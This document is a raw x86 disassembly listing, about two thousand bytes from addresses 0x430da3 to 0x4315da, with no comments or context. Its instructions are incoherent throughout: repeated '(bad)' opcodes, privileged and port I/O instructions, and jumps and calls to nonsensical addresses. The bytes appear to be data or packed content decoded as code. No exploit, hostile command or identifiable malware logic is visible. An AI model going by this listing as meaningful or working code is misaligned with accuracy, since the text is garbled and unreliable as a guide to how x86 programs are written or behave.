  430da3:	leave  
  430da4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430da8:	add    BYTE PTR [ecx+0x0],dl
  430dab:	inc    ebp
  430dac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430db2:	add    BYTE PTR [eax-0x7fbf448],bh
  430db8:	add    al,0x2
  430dba:	jmp    0x57eb914
  430dbf:	jne    0x430da9
  430dc1:	mov    eax,DWORD PTR [edx]
  430dc3:	or     BYTE PTR [eax],al
  430dc5:	inc    ecx
  430dc6:	stc    
  430dc7:	in     eax,dx
  430dc8:	ss inc eax
  430dca:	aas    
  430dcb:	out    0x7d,eax
  430dcd:	inc    ecx
  430dce:	mov    ebp,ecx
  430dd0:	lock ret 0x7d
  430dd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430dda:	add    bh,bh
  430ddc:	aad    0xd7
  430dde:	add    dh,cl
  430de0:	clts   
  430de2:	(bad)  
  430de3:	call   0xffce0ce8
  430de8:	hlt    
  430de9:	iret   
  430dea:	jge    0x430dc2
  430dec:	rol    DWORD PTR [esi-0x80],cl
  430def:	jmp    0x1c5cfc
  430df4:	out    dx,al
  430df5:	mov    eax,DWORD PTR [ebx]
  430df7:	(bad)  
  430df8:	pop    esi
  430df9:	push   es
  430dfa:	cmp    al,0xe8
  430dfc:	sar    edi,0x8
  430dff:	inc    DWORD PTR [edi]
  430e01:	inc    esi
  430e02:	(bad)  
  430e03:	loopne 0x430e83
  430e05:	push   edi
  430e06:	push   cs
  430e07:	push   ebx
  430e08:	add    BYTE PTR [ebx+0x24008b56],cl
  430e0e:	add    BYTE PTR [ebp+0x50],al
  430e11:	push   eax
  430e12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e18:	sub    edx,DWORD PTR [esi-0x24]
  430e1b:	jne    0x430dd3
  430e1d:	lods   eax,DWORD PTR ds:[esi]
  430e1e:	mov    edx,DWORD PTR [edx-0x34]
  430e21:	dec    esi
  430e22:	out    0x83,eax
  430e24:	into   
  430e25:	push   edi
  430e27:	loopne 0x430df7
  430e29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e34:	rol    DWORD PTR [edx],0x8
  430e37:	mov    esp,ecx
  430e39:	cmp    DWORD PTR [ebx],0xc
  430e3c:	mov    esi,0x5001c0
  430e41:	push   eax
  430e42:	push   cs
  430e43:	push   eax
  430e44:	(bad)  
  430e45:	sub    edx,edi
  430e47:	push   esi
  430e48:	adc    al,0xcb
  430e4a:	ins    DWORD PTR es:[edi],dx
  430e4b:	mov    eax,0x203e8
  430e50:	add    al,ah
  430e52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e59:	add    dh,al
  430e5b:	add    ah,ch
  430e5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e63:	pop    ecx
  430e64:	or     eax,ebx
  430e66:	cli    
  430e67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e6d:	lea    ebp,[ebx]
  430e6f:	mov    edx,DWORD PTR [edx-0x4]
  430e72:	dec    ecx
  430e73:	inc    ebp
  430e74:	shr    BYTE PTR [ebx],0x4b
  430e77:	and    al,0x0
  430e79:	(bad)  
  430e7a:	jne    0x430ec1
  430e7c:	pop    eax
  430e7d:	mov    al,0x5a
  430e7f:	call   0x14210de
  430e84:	and    al,0x85
  430e86:	push   edx
  430e87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e8b:	dec    ebp
  430e8c:	mov    cl,0x23
  430e8e:	jmp    0x430e7c
  430e90:	mov    al,0xe7
  430e92:	call   0x1391180
  430e97:	shr    DWORD PTR [eax+ebx*2],cl
  430e9a:	lock (bad) 
  430e9c:	adc    eax,0x757f008d
  430ea1:	out    0x58,eax
  430ea3:	cmp    al,0x7
  430ea5:	pop    edx
  430ea6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ead:	push   ecx
  430eae:	cld    
  430eaf:	mov    esi,0x3b0175
  430eb4:	and    al,0xb0
  430eb6:	xor    BYTE PTR [edx+0x1],0x8b
  430eba:	add    ah,bh
  430ebc:	mov    edi,DWORD PTR [ebp-0x4]
  430ebf:	psubsw mm7,QWORD PTR [edi]
  430ec2:	add    DWORD PTR [ebp+0x0],ebp
  430ec5:	rcr    eax,1
  430ec7:	mov    edi,ecx
  430ec9:	and    eax,DWORD PTR [eax]
  430ecb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ed1:	call   0x13011ba
  430ed6:	add    al,cl
  430ed8:	mov    ebp,esi
  430eda:	aam    0x83
  430edc:	or     DWORD PTR [ecx],eax
  430ede:	jne    0x430ed1
  430ee0:	mov    eax,DWORD PTR [eax]
  430ee2:	aam    0x0
  430ee4:	dec    ebp
  430ee5:	jne    0x430e72
  430ee7:	cmp    ebx,eax
  430ee9:	jb     0x430f38
  430eeb:	jmp    0x430e78
  430eed:	mov    ebx,esp
  430eef:	int3   
  430ef0:	dec    ebp
  430ef1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430ef8:	mov    edx,0x8b0a8b
  430efd:	cmp    ecx,DWORD PTR [eax]
  430eff:	jb     0x430ed8
  430f01:	pop    edx
  430f02:	push   edi
  430f03:	cli    
  430f04:	pop    es
  430f05:	mov    eax,ecx
  430f07:	jb     0x430f0b
  430f09:	add    DWORD PTR [ebx],0xa
  430f0c:	mov    eax,DWORD PTR [ebx]
  430f0e:	int3   
  430f0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f15:	jmp    0x430ea2
  430f17:	mov    al,0xe8
  430f19:	call   0x104119b
  430f1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430f21:	pop    edi
  430f22:	or     BYTE PTR [ecx-0x73],bl
  430f25:	pop    ecx
  430f26:	inc    edi
  430f27:	xor    al,0xeb
  430f29:	push   ecx
  430f2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f30:	call   0xb21035
  430f35:	int3   
  430f36:	sbb    BYTE PTR [esi],ch
  430f38:	inc    ebp
  430f39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f3f:	call   0x9c11ae
  430f44:	or     BYTE PTR [ebx-0x73],dl
  430f47:	cmp    al,0x47
  430f49:	mov    al,0x1
  430f4b:	jb     0x430f4d
  430f4d:	mov    al,0x10
  430f4f:	push   eax
  430f50:	add    al,0x75
  430f52:	add    BYTE PTR [ebx],ch
  430f54:	add    ebx,esp
  430f56:	int3   
  430f57:	jne    0x430f69
  430f59:	movsx  edx,cl
  430f5c:	add    DWORD PTR [eax],eax
  430f5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f65:	mov    gs,edi
  430f67:	add    BYTE PTR [eax-0x50],ch
  430f6a:	add    al,ch
  430f6c:	mov    eax,DWORD PTR [ecx]
  430f6e:	sub    eax,DWORD PTR [eax]
  430f70:	jb     0x430fe7
  430f72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f76:	jge    0x430f60
  430f78:	add    al,0x1
  430f7a:	add    DWORD PTR [eax],0x0
  430f7d:	jne    0x430f7f
  430f7f:	je     0x430fc6
  430f81:	mov    eax,DWORD PTR [edi]
  430f83:	ror    BYTE PTR [ebp+0x4d],1
  430f86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f93:	mov    DWORD PTR [ebx],ebp
  430f95:	fadd   DWORD PTR [eax+0x75]
  430f98:	inc    eax
  430f99:	pop    eax
  430f9a:	lea    ebx,[ecx+0x4f]
  430f9d:	push   0xb1000003
  430fa2:	out    dx,eax
  430fa3:	add    ebp,DWORD PTR [edx+edx*2]
  430fa6:	add    BYTE PTR [ebx+ecx*4],bh
  430fa9:	mov    ch,BYTE PTR [ebx]
  430fab:	jb     0x43101f
  430fad:	add    al,0x89
  430faf:	push   eax
  430fb0:	call   0x842b5d22
  430fb5:	add    DWORD PTR [eax+eax*1],eax
  430fb8:	jae    0x430fce
  430fba:	icebp  
  430fbb:	inc    ebp
  430fbc:	mov    eax,DWORD PTR gs:[ecx]
  430fbf:	int3   
  430fc0:	out    dx,al
  430fc1:	loopne 0x431010
  430fc3:	sub    eax,DWORD PTR [edx]
  430fc5:	push   0xffffff83
  430fc7:	pop    esi
  430fc8:	push   cs
  430fc9:	jl     0x430fe4
  430fcb:	add    al,0xaf
  430fcd:	xor    eax,0x832b6d00
  430fd2:	mov    eax,DWORD PTR [edx]
  430fd4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430fe0:	inc    ebp
  430fe1:	shr    ebx,0x3
  430fe4:	or     DWORD PTR [eax],0x4
  430fe7:	push   0xffffffa5
  430fe9:	pop    esi
  430fea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ff1:	jmp    0x431050
  430ff3:	mov    edi,0xff0272
  430ff8:	fdivr  QWORD PTR [ebp+0x5d]
  430ffb:	push   0x4e
  430ffd:	pop    ecx
  430ffe:	call   0x435403
  431003:	mov    DWORD PTR [ebx],eax
  431005:	in     al,0xc8
  431007:	rol    BYTE PTR [ebp-0x75],0xc1
  43100b:	call   0xad11ec
  431010:	pop    esi
  431011:	enter  0xceff,0x8b
  431015:	repz mov ecx,DWORD PTR [ebp-0x34]
  431019:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431020:	je     0x431022
  431022:	or     DWORD PTR [ebx-0x74183b24],eax
  431028:	jne    0x43100e
  43102a:	jmp    0x431025
  43102c:	push   DWORD PTR [edx-0x24]
  43102f:	push   0x4d
  431031:	pop    ecx
  431032:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431036:	jge    0x43103e
  431038:	mov    eax,eax
  43103a:	sub    ebp,DWORD PTR [edx+0x24]
  43103d:	pop    esi
  43103e:	inc    ebp
  43103f:	mov    esp,0x8b6077
  431044:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43104a:	lods   al,BYTE PTR ds:[esi]
  43104b:	add    BYTE PTR [ebx],bh
  43104d:	enter  0xce73,0x49
  431051:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431059:	stc    
  43105a:	jge    0x4310ce
  43105c:	jnp    0xdd4293cb
  431062:	call   0xc61138
  431067:	fadd   st(0),st
  431069:	dec    esi
  43106a:	ins    BYTE PTR es:[edi],dx
  43106b:	stc    
  43106c:	cmp    al,0x73
  43106e:	push   ebp
  43106f:	mov    eax,0xf8028b
  431074:	jne    0x431037
  431076:	mov    esi,ecx
  431078:	mov    esp,DWORD PTR [ebp+0x2c]
  43107b:	add    edi,DWORD PTR [ebp-0x24]
  43107e:	sub    esp,eax
  431080:	and    al,0x45
  431082:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431088:	sbb    al,0xee
  43108a:	pop    esi
  43108b:	call   0x8310bb
  431090:	fsubr  st,st(3)
  431092:	sti    
  431093:	add    BYTE PTR gs:[ecx],bh
  431096:	add    eax,esp
  431098:	add    DWORD PTR [esi],eax
  43109a:	rol    DWORD PTR [ebp+0x8],0x29
  43109e:	mov    esp,eax
  4310a0:	clc    
  4310a1:	jne    0x431118
  4310a3:	mov    eax,0x8b0673
  4310a8:	loopne 0x4310ef
  4310aa:	loopne 0x431035
  4310ac:	lods   al,BYTE PTR ds:[esi]
  4310ad:	int3   
  4310ae:	inc    ebp
  4310af:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310b3:	add    al,0xc3
  4310b5:	sub    ecx,DWORD PTR [ebp+0x47]
  4310b8:	(bad)  
  4310ba:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310be:	add    eax,DWORD PTR [eax]
  4310c0:	call   0x644d1c5
  4310c5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310cb:	dec    esi
  4310cc:	ins    DWORD PTR es:[edi],dx
  4310cd:	in     al,dx
  4310ce:	lea    eax,[eax]
  4310d0:	inc    ebp
  4310d1:	inc    ebp
  4310d2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310d8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310e2:	and    al,0xdc
  4310e4:	ror    DWORD PTR [edx+0x24],0xf7
  4310e8:	or     BYTE PTR [ebp+0x4c],dh
  4310eb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4310ef:	stos   BYTE PTR es:[edi],al
  4310f0:	adc    edx,edi
  4310f2:	inc    esp
  4310f3:	add    edi,DWORD PTR [eax]
  4310f5:	jne    0x4310da
  4310f7:	mov    DWORD PTR [eax-0x7449db04],ecx
  4310fd:	cmp    ecx,DWORD PTR [edi]
  4310ff:	sub    BYTE PTR [ebp-0x7e],dl
  431102:	sar    ebp,0xb
  431105:	jmp    FWORD PTR [edi+0x2400392a]
  43110b:	sub    esi,DWORD PTR [ebx-0x73]
  43110e:	mov    esp,DWORD PTR [ecx+edi*4]
  431111:	mov    ecx,DWORD PTR [eax]
  431113:	and    BYTE PTR [eax],al
  431115:	jne    0x4310e1
  431117:	sub    ebp,ecx
  431119:	sbb    BYTE PTR [esi+0x32],ah
  43111c:	dec    ebp
  43111d:	push   ebp
  43111e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431124:	ret    
  431125:	mov    edx,ebp
  431127:	leave  
  431128:	sub    DWORD PTR [esi+0x24],ebx
  43112b:	ret    0x2b
  43112e:	pop    ax
  431130:	push   ebp
  431131:	rol    BYTE PTR [ebx],0xeb
  431134:	add    DWORD PTR [ecx+0x6c0001],0x40
  43113b:	jb     0x431192
  43113d:	ret    
  43113e:	in     al,dx
  43113f:	jecxz  0x4310cc
  431141:	push   esi
  431142:	xchg   esp,eax
  431143:	jne    0x431145
  431145:	cmp    edx,DWORD PTR [esi+0x1c]
  431148:	jne    0x43112e
  43114a:	mov    eax,DWORD PTR [ebp-0x77]
  43114d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431154:	mov    esi,DWORD PTR [ebp-0x75]
  431157:	pop    esi
  431158:	nop
  431159:	mov    eax,DWORD PTR [eax]
  43115b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431161:	add    al,0x0
  431163:	inc    ebp
  431164:	mov    eax,DWORD PTR [ebx]
  431166:	mov    ebp,ebx
  431168:	cmp    al,0xf
  43116a:	or     al,al
  43116c:	inc    ebp
  43116d:	inc    ebp
  43116e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431174:	cld    
  431175:	add    BYTE PTR [edi+0x546c16c0],dh
  43117b:	add    BYTE PTR [ecx-0x5],dl
  43117e:	add    eax,0x17200
  431183:	sbb    al,0x85
  431185:	dec    esp
  431186:	je     0x4311c0
  431188:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43118c:	add    BYTE PTR [ebx],bh
  43118e:	(bad)  
  43118f:	and    al,0x32
  431191:	jae    0x43112f
  431193:	mov    cl,cl
  431195:	inc    DWORD PTR [esp]
  431198:	push   ebp
  431199:	shr    esp,0x8
  43119c:	in     al,dx
  43119d:	push   esp
  43119e:	add    DWORD PTR [eax],esp
  4311a0:	add    bl,cl
  4311a2:	inc    ebp
  4311a3:	mov    bh,0x89
  4311a5:	add    ah,bh
  4311a7:	jmp    0xca7520f1
  4311ac:	pushf  
  4311ad:	dec    esp
  4311ae:	mov    edx,0xf8178520
  4311b3:	fst    DWORD PTR [ebp+0x0]
  4311b6:	mov    BYTE PTR [eax],0xc4
  4311b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4311bc:	inc    ebp
  4311bd:	add    eax,0xc601da
  4311c2:	mov    al,0xc6
  4311c5:	ins    BYTE PTR es:[edi],dx
  4311c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311cd:	dec    esp
  4311ce:	jmp    DWORD PTR [eax]
  4311d0:	inc    ebp
  4311d1:	fnstcw WORD PTR [esi+0x29]
  4311d4:	test   BYTE PTR [eax],0xc8
  4311d7:	rol    BYTE PTR [eax],0xc0
  4311da:	lea    ecx,[ebp-0x3cf0dbcb]
  4311e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311e6:	inc    esi
  4311e7:	add    DWORD PTR [eax],ebx
  4311e9:	add    dh,bh
  4311eb:	mov    esi,DWORD PTR [edx+0x8]
  4311ee:	(bad)  
  4311ef:	fdiv   QWORD PTR ss:[ecx]
  4311f2:	(bad)  
  4311f3:	mov    bl,ch
  4311f5:	add    esi,eax
  4311f7:	add    dh,bl
  4311f9:	or     esi,eax
  4311fb:	mov    dl,0xdf
  4311fd:	add    esi,eax
  4311ff:	add    al,ah
  431201:	push   cs
  431202:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431209:	or     BYTE PTR [ebx],dh
  43120b:	dec    ecx
  43120c:	lea    eax,[ebx]
  43120e:	xor    eax,0x18fc0fc7
  431213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431214:	repz clc 
  431216:	add    eax,DWORD PTR [ebp+0x46]
  431219:	prefetcht0 BYTE PTR [ecx-0x2]
  43121d:	xor    eax,0x7c60872
  431222:	mov    esp,0xbd32c69b
  431227:	pop    esi
  431228:	mov    cl,0xbe
  43122b:	or     al,0xc6
  43122d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431234:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43123b:	add    dh,al
  43123d:	mov    eax,ebx
  43123f:	xor    DWORD PTR [ebx],0x35008dbc
  431245:	mov    ecx,DWORD PTR [edi]
  431247:	sbb    al,0x18
  431249:	inc    ebp
  43124a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431251:	clc    
  431252:	(bad)  
  431253:	xor    DWORD PTR [edx-0x64],esi
  431256:	lea    ecx,[ecx+0x45ffe838]
  43125c:	mov    ecx,ebx
  43125e:	fadd   st,st(6)
  431260:	dec    ebp
  431261:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431267:	out    0x1,eax
  431269:	inc    ebp
  43126a:	lea    ebp,ds:0xc8ffc6ff
  431270:	enter  0xa33,0xc6
  431274:	push   ebp
  431275:	leave  
  431276:	(bad)  
  431277:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43127d:	add    BYTE PTR [ebp+0x44],al
  431280:	mov    eax,esp
  431282:	mov    WORD PTR [esi+0x46398300],?
  431288:	psubusw mm4,QWORD PTR [esi-0x78]
  43128c:	add    BYTE PTR [ebx-0x1303f975],al
  431292:	add    BYTE PTR [ebp+0x1],0xeb
  431296:	add    BYTE PTR [ebp+0x38],al
  431299:	in     eax,dx
  43129a:	inc    ebp
  43129b:	inc    ebp
  43129c:	mov    ebx,ebx
  43129e:	add    BYTE PTR [ebp+0x0],0xec
  4312a2:	mov    DWORD PTR [ebp-0x41],eax
  4312a5:	sub    eax,0x2c00454e
  4312aa:	ins    DWORD PTR es:[edi],dx
  4312ab:	inc    ebp
  4312ac:	add    BYTE PTR [esi+0x66],bh
  4312af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312c0:	dec    edi
  4312c1:	pop    es
  4312c2:	add    ah,ch
  4312c4:	mov    DWORD PTR [ebp+0x68],eax
  4312c7:	in     eax,dx
  4312c8:	inc    DWORD PTR [ebp-0x7d]
  4312cb:	out    0xc0,al
  4312cd:	inc    ebp
  4312ce:	mov    edx,esp
  4312d0:	push   0x45
  4312d2:	(bad)  
  4312d3:	jmp    0xdf925890
  4312d8:	add    BYTE PTR [ebp-0x77],al
  4312db:	out    dx,al
  4312dc:	ins    BYTE PTR es:[edi],dx
  4312dd:	inc    ebp
  4312de:	jmp    edi
  4312e0:	add    DWORD PTR [ebp-0x14],0x7e
  4312e4:	mov    esi,esi
  4312e6:	outs   dx,BYTE PTR ds:[esi]
  4312e7:	inc    esp
  4312e8:	(bad)  
  4312e9:	mov    esp,0x8341b68d
  4312ee:	mov    DWORD PTR [esi+0x70],eax
  4312f1:	fcos   
  4312f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4312f9:	in     al,dx
  4312fa:	jb     0x431281
  4312fc:	(bad)  
  4312fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431303:	mov    edi,edi
  431305:	fdivr  st,st(7)
  431307:	out    dx,eax
  431308:	rcl    BYTE PTR [ebx],0x66
  43130b:	mov    DWORD PTR [ebp-0xc70075],eax
  431311:	(bad)  
  431312:	std    
  431313:	cmp    eax,DWORD PTR [eax]
  431315:	jne    0x43137d
  431317:	mov    DWORD PTR [ebp-0xba0048],eax
  43131d:	in     al,dx
  43131e:	outs   dx,BYTE PTR ds:[esi]
  43131f:	pushf  
  431320:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431326:	inc    DWORD PTR [ecx]
  431328:	inc    DWORD PTR [eax]
  43132a:	jae    0x431364
  43132c:	add    BYTE PTR [ebp+0x850266],al
  431332:	inc    DWORD PTR [ebp-0x1]
  431335:	mov    eax,eax
  431337:	jl     0x43139f
  431339:	add    BYTE PTR [ebp-0x740077],al
  43133f:	cld    
  431340:	dec    eax
  431341:	add    BYTE PTR [eax],0x1
  431344:	data16 add BYTE PTR [ebp+0x38],al
  431348:	mov    eax,0x47c2
  43134d:	mov    eax,0x824f89
  431352:	inc    edi
  431353:	mov    DWORD PTR [edx+0x64],ebp
  431356:	inc    WORD PTR [ebp-0x75]
  43135a:	(bad)  
  43135b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431362:	inc    ebp
  431363:	jge    0x431344
  431365:	add    bh,ah
  431367:	lea    ax,[ebp-0x750030]
  43136e:	add    al,0x46
  431371:	jmp    0x40ff:0x8885
  431377:	push   DWORD PTR [ebp+0x52]
  43137a:	lea    eax,[eax]
  43137c:	shl    BYTE PTR [esi-0x7b],1
  43137f:	test   esi,edi
  431381:	(bad)  
  431382:	(bad)  
  431383:	inc    DWORD PTR [ebp-0x990140]
  431389:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43138f:	inc    edi
  431390:	push   ecx
  431391:	xor    ax,WORD PTR [ebp-0x8d0045]
  431398:	add    al,al
  43139a:	ret    
  43139b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313a2:	push   eax
  4313a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313aa:	add    BYTE PTR [ebx-0x764f8839],al
  4313b0:	push   DWORD PTR [esi+0x1]
  4313b3:	inc    DWORD PTR [eax]
  4313b5:	mov    eax,0xff99ff
  4313ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313c0:	jne    0x43137a
  4313c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313cc:	mov    ecx,0xd74fb8
  4313d1:	add    cl,al
  4313d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313e0:	(bad)  
  4313e1:	push   ebp
  4313e3:	mov    eax,0x8c2789
  4313e8:	ret    0x6689
  4313eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4313ef:	add    bh,ah
  4313f1:	mov    WORD PTR [ebp-0x70],ax
  4313f5:	(bad)  
  4313f6:	ret    0x667d
  4313f9:	or     BYTE PTR [ebp-0x77],dl
  4313fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431403:	loop   0x43138e
  431405:	(bad)  
  431406:	xchg   esi,eax
  431407:	aam    0xcf
  431409:	out    dx,al
  43140a:	mov    DWORD PTR [esi-0x68],edi
  43140d:	inc    ebp
  43140e:	dec    edx
  43140f:	pop    ecx
  431410:	mov    edx,DWORD PTR [eax]
  431412:	repnz push bp
  431415:	or     BYTE PTR [ebx+0x55106638],0x49
  43141c:	(bad)  
  43141d:	repnz xor eax,0xa0898945
  431423:	mov    ah,0x89
  431425:	jmp    DWORD PTR [edx+0x66b0418d]
  43142b:	inc    DWORD PTR [ebp+0x50]
  43142e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431432:	mov    DWORD PTR [eax],ecx
  431434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431435:	pop    es
  431436:	inc    ecx
  431437:	(bad)  
  431438:	data16 fwait
  43143a:	inc    ebp
  43143b:	xor    ah,BYTE PTR [esi+0x3]
  43143e:	dec    ebp
  43143f:	push   eax
  431440:	inc    bp
  431442:	jge    0x4313c7
  431444:	mov    esp,DWORD PTR [esi-0x18]
  431447:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43144d:	add    DWORD PTR [ebx],esi
  43144f:	add    BYTE PTR [ebx],al
  431451:	test   DWORD PTR [ebx],esi
  431453:	(bad)  
  431454:	inc    WORD PTR [ebp+0x0]
  431458:	mov    eax,DWORD PTR [eax]
  43145a:	call   0x8898cb8f
  43145f:	mov    esi,eax
  431461:	clc    
  431462:	ret    
  431463:	rol    cl,0xa
  431466:	mov    DWORD PTR ds:0x7c0ec88,esi
  43146c:	mov    edx,edi
  43146e:	pushf  
  43146f:	pop    es
  431470:	jmp    FWORD PTR [edx+0x66]
  431473:	add    BYTE PTR [ebp-0x990175],al
  431479:	inc    ebp
  43147a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431480:	push   ebp
  431481:	mov    edi,eax
  431483:	mov    dh,BYTE PTR [eax+0x266ff51]
  431489:	push   ebp
  43148a:	add    BYTE PTR [ebx-0x764b0777],al
  431490:	dec    DWORD PTR [esi+0x661851e8]
  431496:	add    BYTE PTR [ebp-0x7b],dl
  431499:	cmp    esi,0xfffffffb
  43149c:	dec    DWORD PTR [ecx+0x51fe9285]
  4314a2:	jmp    DWORD PTR [esi-0x75]
  4314a5:	push   ebp
  4314a6:	hlt    
  4314a7:	data16 (bad) 
  4314a9:	dec    ebp
  4314aa:	ret    
  4314ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314b1:	lea    edx,[eax-0x1]
  4314b4:	jne    0x431487
  4314b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314bc:	dec    BYTE PTR [ecx+0x51559eff]
  4314c2:	mov    DWORD PTR [esi-0x4c],esp
  4314c5:	push   ebp
  4314c6:	jmp    DWORD PTR [esi-0x18]
  4314c9:	inc    ebp
  4314ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314d0:	(bad)  
  4314d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314d2:	inc    eax
  4314d4:	test   DWORD PTR [esi-0x2],esp
  4314d7:	inc    ebp
  4314d8:	dec    DWORD PTR [ebp-0x760bde75]
  4314de:	(bad)  
  4314df:	test   al,0xc3
  4314e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314e7:	lods   al,BYTE PTR ds:[esi]
  4314e8:	push   eax
  4314e9:	inc    ebp
  4314ea:	jne    0x4314fb
  4314ec:	dec    DWORD PTR [ebp+0x8]
  4314ef:	mov    ecx,DWORD PTR [ebx]
  4314f1:	sbb    al,0x0
  4314f3:	(bad)  
  4314f4:	mov    eax,0xc14fc3
  4314f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4314ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431503:	xor    eax,DWORD PTR [eax]
  431505:	add    eax,edi
  431507:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43150d:	xor    edi,DWORD PTR [eax+0x854f66]
  431513:	dec    BYTE PTR [ecx-0x76bb01]
  431519:	mov    BYTE PTR [ebx-0x76724001],al
  43151f:	pushf  
  431520:	inc    esi
  431521:	(bad)  
  431522:	dec    DWORD PTR [ebp-0x7abe6373]
  431528:	sar    esi,0x89
  43152b:	dec    DWORD PTR [eax+0x0]
  43152e:	inc    DWORD PTR [eax]
  431530:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431537:	xlat   BYTE PTR ds:[ebx]
  431538:	dec    edx
  431539:	add    bh,bh
  43153b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431541:	lea    esp,[esi-0x50]
  431544:	(bad)  
  431545:	(bad)  
  431546:	call   DWORD PTR [eax-0x1]
  431549:	inc    ebp
  43154a:	rdpmc  
  43154c:	add    BYTE PTR [ebx],al
  43154e:	push   ax
  431550:	lea    eax,[ebp-0x1]
  431556:	js     0x431557
  431558:	add    al,bh
  43155a:	push   bp
  43155c:	lea    ecx,[ebp-0x7701]
  431562:	fmul   DWORD PTR [ebp-0x7a997800]
  431568:	(bad)  
  431569:	(bad)  
  43156a:	(bad)  
  43156b:	(bad)  
  43156c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431572:	dec    eax
  431573:	mov    eax,0x8d8dffff
  431578:	mov    al,0xb0
  43157a:	(bad)  
  43157b:	call   DWORD PTR [ecx+0x50]
  43157e:	dec    ebp
  43157f:	inc    ebp
  431580:	mov    esi,0x7030833
  431585:	push   eax
  431586:	into   
  431587:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43158d:	call   DWORD PTR [ecx-0x8]
  431590:	lea    edx,[ebp-0x1]
  431593:	jmp    0x761797
  431598:	inc    eax
  431599:	jnp    0x431528
  43159b:	add    dh,bh
  43159d:	inc    WORD PTR [ebp-0x8a00b0]
  4315a4:	mov    edx,eax
  4315a6:	inc    esp
  4315a7:	add    bh,bh
  4315a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315af:	dec    DWORD PTR [ebx-0x7f820301]
  4315b5:	add    BYTE PTR [ecx],al
  4315b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4315be:	inc    eax
  4315c0:	(bad)  
  4315c1:	dec    si
  4315c3:	test   edi,edi
  4315c5:	(bad)  
  4315c6:	cmp    edi,edi
  4315c8:	add    ecx,DWORD PTR [edi-0x39]
  4315cb:	mov    edx,DWORD PTR [edx+0x66]
  4315ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4315d4:	mov    eax,0x66ff8b5e
  4315da:	jmp    0xb4ff:0xc7ff3895
